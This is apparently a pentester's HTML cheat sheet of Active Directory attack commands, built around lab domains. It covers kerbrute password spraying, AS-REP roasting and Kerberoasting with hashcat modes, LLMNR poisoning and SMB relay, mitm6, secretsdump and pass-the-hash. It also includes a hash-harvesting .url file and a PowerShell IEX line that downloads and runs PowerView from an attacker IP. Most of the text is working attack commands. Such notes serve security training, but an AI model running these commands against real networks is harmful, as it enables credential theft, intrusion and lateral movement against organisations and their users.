<h1> Kerbrute </h1><br>
Only do usernames as to not lockout users <br>
Located in my downloads <br>
./kerbrute_linux_amd64 userenum -d spookysec.local --dc 10.10.103.225 users.txt <br> <br>
For password spray - kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
<br>
<h1> Query Ticket auth with no password </h1><br>
take valid usernames from kerbrute and place into new user file <br>
sudo python3 /home/kali/impacket/examples/GetNPUsers.py -dc-ip 10.10.103.225 spookysec.local/ -usersfile users.txt -format john -outputfile hashes <br>
cat hashes - look for any usernames with hashes here to crack <br>
<br>
To crack this with hashcat, you need to add a 23 to the hash between rep and name - so e.g $krb5asrep$23$asdas - https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat<br>
hashcat mode -m 18200 <br>
<h1> Username grabbing </h1> <br>
enum4linux -U DCIP  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]" <br>
crackmapexec smb 172.16.5.5 --users (this is null session <br>
If you have creds - sudo crackmapexec smb 172.16.7.3 -u AB920 -p weasal --users <br>
Can now spray passwords with kerbrute - kerbrute passwordspray -d domain --dc IP validusers.txt Welcome1
<br>

<h1>LLMNR Poisoning</h1><br>
fallback with share that is unknown, device reaches out with broadcast to see if any device knows the share, malicious machine asks for hash to direct user <br>
<br>
Responder is used to capture the hashes (type locate responder to find the path) - python3 responder.py -I eth0 -rdwv <br>
Run tool first thing in morning on a pen test and right after lunch <br>
<br>
Next you'll want to crack the hashes - Hashcat runs better on normal PC and not VM due to using GPU. Copy whole hash, add to text file.
<br>
hashcat -m 5600 file.txt rockyou.txt --force ------  -m 5600 stands for AD hash NetNTLMv2 <br>
<br>
<h1>SMB Relay</h1><br>
Instead of cracking hashes from responder, can relay hashes to another machine. SMB signing has to be disabled on the target and relayed creds must be admin on machine.<br>
<b> to work have to go to responder.conf and turn off SMB and HTTP</b> <br>
Run Responder.py and also now configure ntlmrelayx.py (locate ntlmrelay) python3 ntlmrelayx.py -tf targets.txt -smb2support (add -i for interactive shell)<br>
<br>
Can gain shell access with pw - run psexec (metasploit module) - need domain, user and pass, may need to try the module several times <br>
Could also use - sudo python3 smbexec.py domain/username:'password'@IP <br>
Or psexec.py domain/username:password@IP <br>
<br>
<h1>Pass Back Attack </h1> <br>
This is an LDAP attack (anything that uses LDAP to connect to AD such as printers) <br>
on LDAP server address within the settings configuration if you change the IP address of the LDAP server to your machine and setup a listerner (responder or netcat) the password will be sent over in cleartext
<br>
<br>
<h1> Force Hashes </h1> <br>
If you already have a user account and can write to a share that has alot of popularity, you can create a file that uses a fake icon file linking back to your IP running responder <br>
name the file "@something.url" and include contents <br>
[InternetShortcut]
URL=https://securify.nl
IconIndex=0
IconFile=\\<responder ip>\leak\leak.ico<br>
  run responder and anyone who visits share will send hash<br>

<h1> MITM6 </h1> <br>
github.com/got-it/mitm6 <br>
mitm6 -I eth0 -d domain.local <br>
Now setup relay attack with ntlmrelayx - ntlmrelayx.py -6 -t ldaps://domainip -wh fakewpad.domain.local -l lootme <br>

<h1>Further strats </h1><br>
Look for web portals that may have default creds, anything on there that shows AD creds? <br>
Check GPO's or hardcoded creds within XML files etc <br>
Look on printers <br>

<h1> Post exploitation <h1><br>
  <h2> Domain Enumeration with Powershell </h2> <br>
  . .\PowerView.ps1 (enter) <br>
  Get-NetDomain (enter)<br>
  Get-DomainPolicy<br>
  Get-NetUser (sometimes passwords are placed in Description) -- Get-NetUser | select description<br>
  
  <h1> Pass the password </h1><br>
  crackmapexec smb IP/CIDR -u user -d domain -p password <br>
  This will loop through the IPs specified to see what devices the user can authenticate against. <br>
  <br>
  Then use smbclient to look into shares <br>
  smbclient -L 172.16.7.50 -U AB920 -W inlanefreight.local
  
  <h1> Pass the Hash </h1><br>
  Crackmapexec IP -u username -H hash --local-auth <br>
  <br>
  <h1> Find valid Domain Admins with lower account </h1> <br>
  python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
  
 <br>
  <h1> Secrets Dump </h1> <br>
  Any machine that allows login via SMB perform a secrets dump on the machine to dump out the local hashes should the account be a administrator <br>
  secretsdump.py domain/username:password@ip
  <br>
  
  <h1> Kerboeroasting </h1><br>
  Goal here is to get a TGS (Service Ticket) to decrypt servers account hash<br>
  python3 /home/kali/impacket/examples/GetUsersSPN.py domain/username:password -dc-ip IP -request <br> (doesnt always need password <br>
  Hashcat -m 13100 textfile.txt wordlist.txt <br>
  <br>
  <h2> Kerbroasting from windows </h2><br>
 
  Run Powerview (download fromn machine that can access the internet - IEX (New-Object System.Net.Webclient).DownloadString('http://10.10.14.160:8000/PowerView.ps1') <br>
 Import-Module .\PowerView.ps1 <br>
Get-DomainUser * -spn | select samaccountname <br>
  Now target account - Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat

